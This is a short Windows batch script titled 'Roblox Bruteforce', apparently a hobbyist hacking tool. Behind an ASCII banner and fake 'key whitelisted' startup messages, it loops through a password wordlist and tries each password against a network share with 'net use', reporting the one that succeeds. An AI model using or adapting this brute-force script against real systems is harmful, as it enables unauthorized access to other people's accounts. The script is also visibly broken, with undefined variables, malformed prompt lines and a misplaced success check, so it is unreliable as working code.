@echo off
title Roblox Bruteforce

echo /$$$$$$$                        /$$                     /$$$$$$$$                                     
echo ! $$__  $$                      ! $$                    ! $$_____/                                     
echo ! $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$       ! $$     /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ 
echo ! $$$$$$$  /$$__  $$! $$  ! $$!_  $$_/   /$$__  $$      ! $$$$$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$
echo ! $$__  $$! $$  \__/! $$  ! $$  ! $$    ! $$$$$$$$      ! $$__/! $$  \ $$! $$  \__/! $$      ! $$$$$$$$
echo ! $$  \ $$! $$      ! $$  ! $$  ! $$ /$$! $$_____/      ! $$   ! $$  ! $$! $$      ! $$      ! $$_____/
echo ! $$$$$$$/! $$      !  $$$$$$/  !  $$$$/!  $$$$$$$      ! $$   !  $$$$$$/! $$      !  $$$$$$$!  $$$$$$$
echo !_______/ !__/       \______/    \___/   \_______/      !__/    \______/ !__/       \_______/ \_______/
                                                                                                       
echo.
                                              echo MADE BY: @solar.xe
echo [16:00] - [STARTUP] - 5
echo [16:00] - [STARTUP] - 4
echo [16:00] - [STARTUP] - 3
echo [16:00] - [STARTUP] - 2
echo [16:00] - [STARTUP] - 1
echo #
echo [16:00] - Insert key : "
echo [16:00] - Whitelisted.
set /p [1] Checker
set /p [2] Bruteforce
echo #
[?] Choose an option: "
set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1

if %errorlevel% EQU 0 goto success


